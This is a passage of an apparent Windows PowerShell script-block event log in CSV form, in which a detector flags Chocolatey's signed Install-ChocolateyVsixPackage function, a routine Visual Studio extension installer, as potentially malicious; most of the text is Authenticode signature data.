B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgM4dhQyywPrPo8jpeR3DNbT7H2WdznBS1+Bus # KT2bfQ0wDQYJKoZIhvcNAQEBBQAEggEAbWUKxJRm84/EF8/zeqa1zKe4AWpJ/gEi # QwtcOXs0Qnyft51e8c1xU2GOQZgAGvgSh7/PxsyVsFf5RMUF4KTVDTiF1PBanepr # vyJHjlmCWoa+NIncrLkelzSZLVmR91IGBpxxuL3E03d1rLOBK3MsTsv/n1l0nTzj # Th0bWNHNjcnJ89/jqS6j0E/x06GXwECdXPke/u6rpZ+ne5huAOlJgmce9bBL1v39 # SLEstdUW37fHTfvf8W4O3vdUYwXayuZOv+5ACQA5wVnwEL/jv+qxNFlM1ciPSuDH # DnFvlJp1vUavbyg9F+n4RYni9EUQTAw9F7Izk3Mt3mS6HCFwSwVWtaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQUAIvU+JA/yY/VMDda # AF5AyoutdvkwDQYJKoZIhvcNAQEBBQAEggEAAw12+/6F/pa2s2bjPlFgk4ZjQcRt # p/abG6OoDWEMorncdvyhrOe39oQxthDUOLm/FW8JvvlFNHxBwjCy4KUxPRTsmmBf # JKzuGv9Au1dfjGJAS+lPZyxTC5nyeKbCnG3Zwy77dAxvN2ZVd/vRhyw/itKoE3Lv # MSvUKhrRTFB1Sm7if/dh9r5YiBFCgKoTJJ9PCxIrGOx6R3Gbci+StDJXHBDOqgDh # HNoYd6Z6V6AKPy3mzU3yitDuMA2ugksV6OHroWUCUGfVkUCPHJZMceJVXzYTbCUS # wgDjjauYaSo+kzjicD27CjwNSeHZP0MSLFSoHfoU76lF2iplygQ1pdmkMw== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:49.392 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,87,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyVsixPackage { <# .SYNOPSIS Downloads and installs a VSIX package for Visual Studio .DESCRIPTION VSIX packages are Extensions for the Visual Studio IDE. The Visual Studio Gallery at http://visualstudiogallery.msdn.microsoft.com/ is the public extension feed and hosts thousands of extensions. You can locate a VSIX Url by finding the download link of Visual Studio extensions on the Visual Studio Gallery. .NOTES Chocolatey works best when the packages contain the software it is managing and doesn't require downloads. However most software in the Windows world requires redistribution rights and when sharing packages publicly (like on the community feed), maintainers may not have those aforementioned rights. Chocolatey understands how to work with that, hence this function. You are not subject to this limitation with internal packages. .INPUTS None .OUTPUTS None .PARAMETER PackageName The name of the package - while this is an arbitrary value, it's recommended that it matches the package id. In 0.10.4+, `Name` is an alias for PackageName. .PARAMETER VsixUrl The URL of the package to be installed. Prefer HTTPS when available. Can be HTTP, FTP, or File URIs. In 0.10.4+, `Url` is an alias for VsixUrl. .PARAMETER VsVersion The major version number of Visual Studio where the package should be installed. This is optional. If not specified, the most recent Visual Studio installation will be targetted. NOTE: For Visual Studio 2015, the VsVersion is 14. It can be determined by looking at the folders under Program Files / Program Files (x86). In 0.10.4+, `VisualStudioVersion` is an alias for VsVersion. .PARAMETER Checksum The checksum hash value of the Url resource. This allows a checksum to be validated for files that are not local. The checksum type is covered by ChecksumType. **NOTE:** Checksums in packages are meant as a measure to validate the originally intended file that was used in the creation of a package is the same file that is received at a future date. Since this is used for other steps in the process related to the community repository, it ensures that the file a user receives is the same file a maintainer and a moderator (if applicable), plus any moderation review has intended for you to receive with this package. If you are looking at a remote source that uses the same url for updates, you will need to ensure the package also stays updated in line with those remote resource updates. You should look into [automatic packaging](https://chocolatey.org/docs/automatic-packages) to help provide that functionality. **NOTE:** To determine checksums, you can get that from the original site if provided. You can also use the [checksum tool available on the community feed](https://chocolatey.org/packages/checksum) (`choco install checksum`) and use it e.g. `checksum -t sha256 -f path\to\file`. Ensure you provide checksums for all remote resources used. .PARAMETER ChecksumType The type of checkum that the file is validated with - valid values are 'md5', 'sha1', 'sha256' or 'sha512' - defaults to 'md5'. MD5 is not recommended as certain organizations need to use FIPS compliant algorithms for hashing - see https://support.microsoft.com/en-us/kb/811833 for more details. The recommendation is to use at least SHA256. .PARAMETER Options OPTIONAL - Specify custom headers. Available in 0.9.10+. .PARAMETER File Will be used for VsixUrl if VsixUrl is empty. Available in 0.10.7+. This parameter provides compatibility, but should not be used directly and not with the community package repository until January 2018. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This downloads the AutoWrockTestable VSIX from the Visual Studio # Gallery and installs it to the latest version of VS. Install-ChocolateyVsixPackage -PackageName ""MyPackage"" ` -VsixUrl http://visualstudiogallery.msdn.microsoft.com/ea3a37c9-1c76-4628-803e-b10a109e7943/file/73131/1/AutoWrockTestable.vsix .EXAMPLE > # This downloads the AutoWrockTestable VSIX from the Visual Studio # Gallery and installs it to Visual Studio 2012 (v11.0). Install-ChocolateyVsixPackage -PackageName ""MyPackage"" ` -VsixUrl http://visualstudiogallery.msdn.microsoft.com/ea3a37c9-1c76-4628-803e-b10a109e7943/file/73131/1/AutoWrockTestable.vsix ` -VsVersion 11 .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage .LINK Install-ChocolateyZipPackage #> param( [alias(""name"")][parameter(Mandatory=$true, Position=0)][string] $packageName, [alias(""url"")][parameter(Mandatory=$false, Position=1)][string] $vsixUrl, [alias(""visualStudioVersion"")][parameter(Mandatory=$false, Position=2)][int] $vsVersion = 0, [parameter(Mandatory=$false)][string] $checksum = '', [parameter(Mandatory=$false)][string] $checksumType = '', [parameter(Mandatory=$false)][hashtable] $options = @{Headers=@{}}, [alias(""fileFullPath"")][parameter(Mandatory=$false)][string] $file = '', [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($vsixUrl -eq '' -or $vsixUrl -eq $null) { $vsixUrl = $file } if($vsVersion -eq 0) { if ([System.IntPtr]::Size -eq 4) { <# 32bits system case #> $versions=(get-ChildItem HKLM:SOFTWARE\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName -match ""^[0-9\.]+$"") } | ? {$_.property -contains ""InstallDir""} | sort {[int]($_.PSChildName)} -descending) } else { $versions=(get-ChildItem HKLM:SOFTWARE\Wow6432Node\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName -match ""^[0-9\.]+$"") } | ? {$_.property -contains ""InstallDir""} | sort {[int]($_.PSChildName)} -descending) } if($versions -and $versions.Length){ $version = $versions[0] }elseif($versions){ $version = $versions } } else { if ([System.IntPtr]::Size -eq 4) { <# 32bits system case #> $versions=(get-ChildItem HKLM:SOFTWARE\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName.EndsWith(""$vsVersion.0"")) } | ? {$_.property -contains ""InstallDir""}) } else { $version=(get-ChildItem HKLM:SOFTWARE\Wow6432Node\Microsoft\VisualStudio -ErrorAction SilentlyContinue | ? { ($_.PSChildName.EndsWith(""$vsVersion.0"")) } | ? {$_.property -contains ""InstallDir""}) } } if ($version) { $vnum=$version.PSPath.Substring($version.PSPath.LastIndexOf('\')+1) if($vnum -as [int] -lt 10) { throw ""This installed VS version, $vnum, does not support installing VSIX packages. Version 10 is the minimum acceptable version."" } $dir=(get-itemProperty $version.PSPath ""InstallDir"").InstallDir $installer = Join-Path $dir ""VsixInstaller.exe"" } if ($installer) { $download=""$env:TEMP\$($packageName.Replace(' ','')).vsix"" try{ Get-ChocolateyWebFile $packageName $download $vsixUrl -checksum $checksum -checksumType $checksumType -Options $options } catch { throw ""There were errors attempting to retrieve the vsix from $vsixUrl. The error message was '$_'."" } Write-Debug ""Installing VSIX using $installer"" $exitCode = Install-Vsix ""$installer"" ""$download"" if($exitCode -gt 0 -and $exitCode -ne 1001) { #1001: Already installed throw ""There was an error installing '$packageName'. The exit code returned was $exitCode."" } } else { throw ""Visual Studio is not installed or the specified version is not present."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAwvbwbcXwGHARv # s0aL6zHGEwZUxYCbjjh5ZcXDMGFCc6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # 